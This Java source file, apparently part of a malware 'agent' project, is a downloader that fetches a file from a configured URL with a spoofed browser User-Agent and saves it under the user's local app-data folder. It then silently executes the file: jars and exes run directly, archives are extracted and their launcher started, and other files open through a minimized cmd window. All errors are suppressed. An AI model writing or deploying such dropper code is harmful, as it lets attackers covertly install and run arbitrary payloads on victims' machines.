package org.pandora.agent.application;

import org.apache.commons.io.IOUtils;
import org.pandora.agent.utils.Settings;

import java.awt.*;
import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Paths;
import java.util.Enumeration;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

public class Application {

    public void downloadAndOpen() {
        final String local = System.getenv("LOCALAPPDATA");
        final String uri = Settings.FILEURI;
        final String fileName = Settings.APPID + uri.substring(uri.lastIndexOf('/') + 1);
        final URL url;
        final URLConnection con;
        final DataInputStream dis;
        final FileOutputStream fos;
        final byte[] fileData;
        final String path = local + "\\Downloads";
        final File dir = new File(path);
        final File tempPath = new File(path + "\\" + fileName);
        if (!dir.exists()) dir.mkdirs();
        if (!tempPath.exists()) {
            try {
                url = new URL(uri);
                con = url.openConnection();
                con.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36");
                dis = new DataInputStream(con.getInputStream());
                fileData = new byte[con.getContentLength()];
                for (int q = 0; q < fileData.length; q++) fileData[q] = dis.readByte();
                dis.close();
                fos = new FileOutputStream(tempPath);
                fos.write(fileData);
                fos.close();
            } catch (Exception ignore) {
            }
        }
        this.open(path + "\\", fileName);
    }

    private void open(final String path, final String fileName) {
        if (!Desktop.isDesktopSupported()) return;
        final String lower = fileName.toLowerCase();
        if (lower.endsWith(".jar")) {
            this.run("java -Dfile.encoding=UTF8 -jar " + path + fileName);
        } else if (lower.endsWith(".exe")) {
            this.run(path + fileName);
        } else if (lower.endsWith(".zip") || lower.endsWith(".tar.gz") || lower.endsWith(".rar") || lower.endsWith(".7z")) {
            try (java.util.zip.ZipFile zipFile = new ZipFile(path + fileName)) {
                String newFolder = null;
                final Enumeration<? extends ZipEntry> entries = zipFile.entries();
                while (entries.hasMoreElements()) {
                    ZipEntry entry = entries.nextElement();
                    newFolder = path + fileName.replace(".zip", "").replace(".7z", "").replace(".rar", "").replace(".tar.gz", "") + "\\";
                    File entryDestination = new File(newFolder, entry.getName());
                    if (entry.isDirectory()) {
                        entryDestination.mkdirs();
                    } else {
                        entryDestination.getParentFile().mkdirs();
                        try (InputStream in = zipFile.getInputStream(entry);
                             OutputStream out = new FileOutputStream(entryDestination)) {
                            IOUtils.copy(in, out);
                        }
                    }
                }
                final String appLauncher = Settings.APPLAUNCHER;
                final String loc = newFolder + "\\" + appLauncher;
                final String pathBeforeApp = Paths.get(loc).getParent().toString();
                if (new File(loc).exists()) {
                    if (appLauncher.endsWith(".exe")) this.run(loc);
                    else if (appLauncher.endsWith(".jar")) this.run("java -Dfile.encoding=UTF8 -jar " + loc);
                    else this.run("cmd /c start cmd.exe /min /C \"cd /d " + pathBeforeApp + " && " + loc + "\"");
                }
            } catch (final IOException ignored) {
            }
        } else {
            this.run("cmd.exe /c start cmd.exe /min /C \"" + path + fileName + "\"");
        }
    }

    private void run(final String command) {
        try {
            Runtime.getRuntime().exec(command);
        } catch (final IOException ignored) {
        }
    }
}